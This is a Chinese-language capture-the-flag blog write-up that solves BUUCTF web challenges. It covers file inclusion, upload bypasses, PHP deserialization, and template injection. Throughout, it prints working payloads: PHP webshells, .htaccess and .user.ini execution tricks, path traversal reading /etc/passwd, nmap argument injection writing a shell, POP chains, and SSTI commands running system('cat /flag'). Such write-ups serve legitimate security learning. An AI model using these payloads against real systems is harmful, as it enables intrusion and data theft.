href="https://blog.csdn.net/weixin_44037296/article/details/110900266">https://blog.csdn.net/weixin_44037296/article/details/110900266</a></p><p>直接上payload:</p><pre><code></code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>进去之后发现有个tips链接，点击链接发现是一个get传参，参数中也提示了flag.php</p><p>直接在get里面传参，用php:&#x2F;&#x2F;filter协议：</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>base64解码后果然有flag。</p><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>看源代码提示我们有个source.php，进入后看源码：</p><img src="/2023/08/03/buuctf/221220.png" class=""><p>然后看到提示hint.php，访问后得到flag在ffffllllaaaagggg下，然后开始审计一波代码。</p><p>首先它先判定了传入的是不是空或者是不是字符串，然后进行了三次白名单判断。里面涉及到mb_substr(),mb_strpos(),urldecode()三个函数。</p><p>**mb_substr(str,start,length,encoding):**返回从start位置开始的长度为length的字符串。</p><p>**mb_strpos(str,find_str,offset,encoding):**返回str中从offset(默认为0)开始第一次出现find_str的位置。</p><p>根据代码分析得到，在第一次$_page取的是从0开始到第一次出现？之间的字符串，所以我们在参数中传入一个？绕过白名单。</p><pre><code>payload:http://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg </code></pre><p>tips:include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>这道题很皮</p><p>打开题目说“你想知道蒋璐源的秘密么？”，先看源码，有个Archive_room.php，进去之后又有个SECRET，点击之后跳转到新页面，显示“查阅结束没看清么？回去再仔细看看吧”，我们试试退回到上一步然后抓包，果然能抓到东西：</p><img src="/2023/08/03/buuctf/193820.png" class=""><p>访问secr3t.php</p><img src="/2023/08/03/buuctf/194100.png" class=""><p><strong>strstr(string <code>$haystack</code>, string <code>$needle</code>, bool <code>$before_needle</code> &#x3D; <code>false</code>): string|false</strong></p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p><p>该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</p><p>可以看到，过滤规则很简单，而且提示的flag.php没有被过滤，那我们应该会想到flag应该不会在flag.php里，但先包含flag.php看看</p><img src="/2023/08/03/buuctf/194620.png" class=""><p>没显示flag,我就在这里。。。可能flag被当作变量了,用php:&#x2F;&#x2F;filter看看</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>解码后出现了flag变量</p><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>主页上有WOOFERS和MEOWERS两个选项，点击后发现url跟着变化，猜测可能是sql注入，试了一下?category&#x3D;woofers“</p><img src="/2023/08/03/buuctf/174823.png" class=""><p>有include()，原来是文件包含，但是我们还可以看到，它自动加上了.php，我们试一下让它包含flag，但是我们可以看到”Sorry, we currently only support woofers and meowers“</p><p>试一下?category&#x3D;woofers&#x2F;..&#x2F;flag：</p><p>{ % asset_img 175749.png%}</p><p>可以看到，flag.php应该是被包含了进去，但flag没有显示，可能是没有输出或者被注释了</p><p>这里我们可以套用伪协议：</p><pre><code>?category=php://filter/convert.base64-encode/woofers/resource=flag</code></pre><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>进去后一堆乱码，也没有什么提示，用dirsearch扫一下：</p><img src="/2023/08/03/buuctf/224819.png" class=""><p>可以直接进去phpmyadmin：</p><img src="/2023/08/03/buuctf/221034.png" class=""><p>数据库里没有东西，这里的利用点是phpmyadmin4.8.1版本存在任意文件读取漏洞：</p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>payload</p><pre><code>target=db_datadict.php%253f/../../../../../../../../etc/passwd</code></pre><img src="/2023/08/03/buuctf/191534.png" class=""><p>尝试读取flag:</p><pre><code>target=db_datadict.php%253f/../../../../../../../../flag</code></pre><p>成功</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>通过测试发现这道题检测了文件后缀，文件类型和文件内容。</p><p>文件后缀我们用.phtml绕过，文件类型我们修改为Content-Type：image&#x2F;jpeg，文件内容它检测到了”&lt;?”,可以用&lt;script language&#x3D;”php”&gt;eval($_POST[shell])&lt;&#x2F;script&gt;绕过，还需要加上文件头GIF89a</p><img src="/2023/08/03/buuctf/210543.png" class=""><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>上来就是一个前端js验证，burp抓包修改后缀：</p><img src="/2023/08/03/buuctf/215809.png" class=""><p>发现response是nonono bad file，试试.phtml后缀</p><img src="/2023/08/03/buuctf/220018.png" class=""><p>成功</p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>这道题很迷，测了很多东西都过不去，甚至最后测一张普通的图片都过不去，最后才在源代码中发现对上传内容长度有限制：$_FILES[“uploaded”][“size”] &lt; 2048。</p><p>那么重新按常规思路走：</p><p>首先修改content-Type必须为image&#x2F;jpeg才可以，然后发现后缀名也不能含有ph，</p><img src="/2023/08/03/buuctf/225239.png" class=""><p>还是不行，修改一句话为&lt;script language&#x3D;”php”&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;成功绕过。</p><p>既然只上传了一个jpg文件，那么还需要上传一个.htaccess</p><p>.htaccess的方法：</p><pre><code>方法一：只将“haha.png”文件当成php文件执行&lt;FilesMatch &quot;haha.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法二：这里时是要包含所有文件带有haha的文件（只要文件名里面有haha都可以），都会被当成php代码执行&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法三：这种方法时，后面的.png或者.jpg文件能被当成php代码执行，如果想换成别的改扩展名就可以AddType application/x-httpd-php .pngAddType application/x-httpd-php .jpg</code></pre><p>最后可以使用蚁剑连接</p><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>测了一下发有黑名单过滤和MIME信息过滤，那就常规操作，上传个png木马，再传个.htaccess文件，将Content-Type修改为image&#x2F;png就行。</p><p>要注意的是，这题用不了system等函数了，但可以用show_source()。</p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开后可以看到是一个文件上传的题目，我们先上传个一句话，测试过程中发现这道题限制了文件后缀，文件头，还过滤了&lt;?，</p><p>所以我们需要上传一个.png的图片马，内容如下：</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[shell])&lt;/script&gt;</code></pre><p>这道题测试了一下虽然可以成功上传.htaccess文件，但不能利用，可能是没有开启AllowOverride All，所以只能使用.user.ini文件（前提是含有.user.ini的文件夹下需要有正常的php文件）</p><pre><code>GIF89aauto_prepend_file=haha.png</code></pre><p>最后需要访问index.php</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><img src="/2023/08/03/buuctf/182338.png" class=""><p>这道题的重点在于这两个函数：</p><pre><code>escapeshellarg()escapeshellcmd()</code></pre><p>参考文章：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><pre><code>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)escapeshellcmd — shell 元字符转义功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\）会在以下字符之前插入：&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</code></pre><img src="/2023/08/03/buuctf/183949.png" class=""><p>然后具体这道题的利用点在nmap这里，在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><pre><code>?host=&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;</code></pre><p>注意事项：</p><p><strong>两边加单引号</strong>是因为，不加的话，两个函数执行后会变成：</p><pre><code>&#39;&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php&#39;</code></pre><p><strong>引号旁边加空格</strong>是因为，如果不加，当两个函数执行后就会生成：</p><pre><code>&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG hack.php&#39;\\&#39;&#39;&#39;</code></pre><p>注意：在bash中，单引号是全引用，被单引号括起的内容不管是常量还是变量都不会发生替换。所以最终就会是</p><pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>首页给出了提示，要找备份文件</p><p>常见的备份文件后缀名：.git .svn .swp .~ .bak .bash_history</p><p>用dirmap可以扫出<a href="http://www.zip,下载下来包括以下文件index.php/">www.zip，下载下来包括以下文件index.php</a> flag.php index.js class.php style.css</p><p>index.php中有入口：</p><pre><code>include &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);</code></pre><p>很明显是php反序列化，看class.php：</p><pre><code>class Name&#123;    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        &#125;    &#125;&#125;?&gt;</code></pre><p>在__destruct()中，我们需要让password弱相等于100，让username等于admin才能得到flag，但是这里有个__wakeup()魔术方法，它在反序列化时先执行，我们需要绕过这个魔术方法</p><p><strong>这里存在一个CVE漏洞：当成员属性数目大于实际数目时可绕过__wakeup()方法</strong></p><p>我们先生成序列化对象：</p><pre><code>&lt;?phpclass Name&#123;    private $username;    private $password;    public function __construct()&#123;        $this-&gt;username=&#39;admin&#39;;        $this-&gt;password=100;    &#125;&#125;echo serialize(new Name());?&gt;</code></pre><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></pre><p>再将成员属性数目改成3，并且在私有属性中添加上%00</p><pre><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>代码审计一下发现__destruct()里的$op与2是强比较，process()函数里的是若比较，所以我们可以</p><p>将op实例化为数字2进行绕过，然后将filename实例化为”.&#x2F;flag.php”。</p><p>但是这里的变量属性是protected，序列化后会出现%00不可见字符，通过不了is_valid()函数</p><p><strong>绕过方法：</strong>因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p><pre><code>&lt;?phpclass FileHandler&#123;    public $op = &quot;2&quot;;    public $filename = &quot;./flag.php&quot;;&#125;echo urlencode(serialize(new FileHandler()));</code></pre><pre><code>payload:O%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3B%7D</code></pre><p>还可以使用伪协议：</p><pre><code>&lt;?phpclass FileHandler&#123;    public $op = 2;    public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;echo urlencode(serialize(new FileHandler()));</code></pre><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>第一层绕过：</p><pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></pre><p>这里就要用到伪协议，php:&#x2F;&#x2F;input和data都可以</p><pre><code>?text=data://text/plain,welcome to the zjctf</code></pre><p>然后：</p><pre><code>else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;</code></pre><p>意思是在useless.php中反序列化</p><p>这里可以用伪协议去读取useless.php:</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>{ % asset_img 101403.png%}</p><p>序列化：</p><pre><code>&lt;?phpclass Flag &#123;    public $file=&#39;flag.php&#39;;&#125;echo serialize(new Flag());</code></pre><p>最终payload：</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>打开后页面一直在闪，找了一下没有什么信息，抓包：</p><img src="/2023/08/03/buuctf/122234.png" class=""><p>这里自动提交了两个参数func和p，猜测源码里应该有call_user_func()函数，用file_get_contents测试一下：</p><pre><code>func=file_get_contents&amp;p=index.php</code></pre><p>输出了index.php源码：</p><p>{ % asset_img 122921.png%}</p><p>代码审计发现我们可以利用反序列化</p><p>序列化：</p><pre><code>&lt;?phpclass Test&#123;    public $p=&quot;find / -name flag*&quot;;    public $func=&quot;system&quot;;&#125;echo serialize(new Test());//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>传参后：</p><img src="/2023/08/03/buuctf/132611.png" class=""><p>读文件&#x2F;tmp&#x2F;flagoefiu4r93：</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><pre><code>class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;</code></pre><p>这道题的函数调用顺序是</p><p><code>__wakeup()</code>-&gt;<code>__toString()</code>-&gt;<code>__get()</code>-&gt;<code>__invoke()</code>-&gt;<code>append</code>-&gt;文件包含</p><p>最主要的一点是调用Show类中的__wakeup()函数后要再调用一次Show类中的__tostring函数</p><p>payload</p><pre><code>&lt;?phpclass Modifier&#123;    protected $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;class Test&#123;    public $p;&#125;class Show&#123;    public $source;    public $str;&#125;$a=new Show();$a-&gt;source=new Show();$a-&gt;source-&gt;str=new Test();$a-&gt;source-&gt;str-&gt;p=new Modifier();echo serialize($a);//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</code></pre><p>注意加%00</p><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><pre><code>&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img)&#123;    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function)&#123;    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!&#125;else if($function == &#39;show_image&#39;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;</code></pre><p>题目提示我们访问phpinfo：</p><img src="/2023/08/03/buuctf/222451.png" class=""><p>应该就是让我们去dog3_f1ag.php里面去找flag</p><p>而这道题的难点就是这里</p><pre><code>if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;</code></pre><p>而且最后面只进行了base64解码，所以在这段代码中我们不可能将img设为d0g3_f1ag.php</p><p>看了下别人wp，这又是一道反序列化字符串逃逸题，看来还是做题太少，想不起来字符串逃逸</p><p>代码中有个extract($_POST)，这也是我们传参的突破口</p><p>用extract函数对数组变量覆盖时，之前的变量会全部消失，例如：</p><pre><code>&lt;?php$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;var_dump($_SESSION);echo &quot;&lt;br/&gt;&quot;;extract($_POST);var_dump($_SESSION);//array(2) &#123; &#39;user&#39; =&gt; string(5) &quot;guest&quot; &#39;function&#39; =&gt; NULL &#125;//&#123; &#39;flag&#39; =&gt; string(3) &quot;123&quot; &#39;user&#39; =&gt; string(5) &quot;admin&quot; &#125;</code></pre><p>当我们传入SESSION[flag]&#x3D;123和SESSION[user]&#x3D;admin时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。只剩下_SESSION[flag]&#x3D;123和_SESSION[user]&#x3D;admin</p><p>然后就是字符串逃逸，反序列化字符串逃逸有两种方式，一种是字符串变多，一种是变少，常见的是字符串变多，而这道题是字符串变少</p><p>字符串逃逸又分为两种形式，键名逃逸和键值逃逸</p><p><strong>1、键值逃逸</strong></p><p>payload</p><pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=f&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;&#125;//后面添加s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;是因为题目在序列化之前添加了一次img，使序列化后的属性数量变为3</code></pre><p>然后题目又让我们去&#x2F;d0g3_fllllllag去找flag</p><pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=f&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;&#125;</code></pre><p><strong>2、键名逃逸</strong></p><p>原理相同</p><pre><code>_SESSION[user]=adddd&amp;_SESSION[flagflagflag]=fddd&quot;;s:3:&quot;fdd&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></pre><h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>首先可以利用php伪协议绕过判断并查看题目中提示的next.php的源码</p><pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre><img src="/2023/08/03/buuctf/210024.png" class=""><p>payload:</p><pre><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;);</code></pre><p>这里的PHP版本是：<code>5.6.40</code>，<code>preg_replace()+/e</code>存在代码执行漏洞</p><p>具体参考文章：</p><p><a href="https://www.xinyueseo.com/websecurity/158.html">https://www.xinyueseo.com/websecurity/158.html</a></p><p><a href="https://www.cnblogs.com/sipc-love/p/14289984.html">https://www.cnblogs.com/sipc-love/p/14289984.html</a></p><h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开后有三个超链接：</p><p>{ % asset_img 173958.png %}</p><p>内容分别是：</p><pre><code>flag in /fllllllllllllagrendermd5(cookie_secret+md5(filename))</code></pre><p>当我们分别去点击这些链接的时候发现url结构都相同：</p><p>{ % asset_img 174339.png %}</p><p>那么我们可以猜到我们想要的payload应该是&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(“&#x2F;fllllllllllllag”))</p><p>所以问题的关键是这个cookie_secret，去百度了一下，发现了一篇现成的文章：</p><p><a href="http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html">http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html</a></p><img src="/2023/08/03/buuctf/174845.png" class=""><p>其实这里的**&#x2F;error?msg&#x3D;**我们点击链接的时候随便破坏一下就可以得到&#x2F;error?msg&#x3D;Error，然后成功得到cookie_secret:</p><img src="/2023/08/03/buuctf/175722.png" class=""><p>最后进行md5加密后即可得到filehash</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>源码中有“The mystery of ip”,主页左上角有Flag菜单选项，点击后发现会显示自己的ip，Hint菜单的源码中提示“Do you know why i know your ip?”，联想到X-Forward-For，抓包传参：</p><img src="/2023/08/03/buuctf/172033.png" class=""><p>果然我们可以控制XFF,然后不知道干什么，看别人wp发现是smart模板注入，我们直接传参：</p><pre><code>&#123;system(&quot;ls&quot;)&#125;&#123;system(&quot;cat /flag&quot;)&#125;</code></pre><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>这里的突破口是flag页面的用户登录</p><p>测试有模板注入漏洞</p><img src="/2023/08/03/buuctf/213113.png" class=""><p>通过判断，是Twig注入，所以有固定的payload</p><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;//查看id&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;//查看flag</code></pre><p>这道题不能直接在页面进行注入，要在cookie里面注入</p><img src="/2023/08/03/buuctf/214658.png" class=""><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><p>题目给的源码：</p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>审计题目给的源码，在shrine路径下测试ssti能正常执行</p><p>接着分析源码，注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接<code>&#123;&#123;config&#125;&#125;</code>或<code>&#123;&#123;self.*dict*&#125;&#125;</code>即可查看所有app.config内容，但是这题设了黑名单，把<code>[‘config’,‘self’]</code>设为None并且过滤了括号；当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。</p><pre><code>current_app,这是全局变量代理（当前app），查看他的config即可</code></pre><p>我们写payload:</p><pre><code>&#123;&#123;url_for.__globals__&#125;&#125;</code></pre><img src="/2023/08/03/buuctf/161525.png" class=""><p>然后：</p><pre><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></pre><img src="/2023/08/03/buuctf/161827.png" class=""><h1 id="混杂"><a href="#混杂" class="headerlink" title="混杂"></a>混杂</h1><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>扫了一下目录发现有.git，应该是git文件泄露，用githack扫一下：</p><img src="/2023/08/03/buuctf/204241.png" class=""><p>能扫到index.php和flag.php，但down不下来，可能是靶机的原因，在网上找一下</p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;print_r($flag);$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#39;yds&#39;;foreach($_POST as $x =&gt; $y)&#123;  // $键 = $值的值    $$x = $y;      &#125;foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y;// $handsome = flag的值  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag&#125; // 需要不满足以下几个条件foreach($_GET as $x =&gt; $y)&#123;    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;  //不能同时 flag的值等于某个键名，那个键值又是flag        exit($handsome);    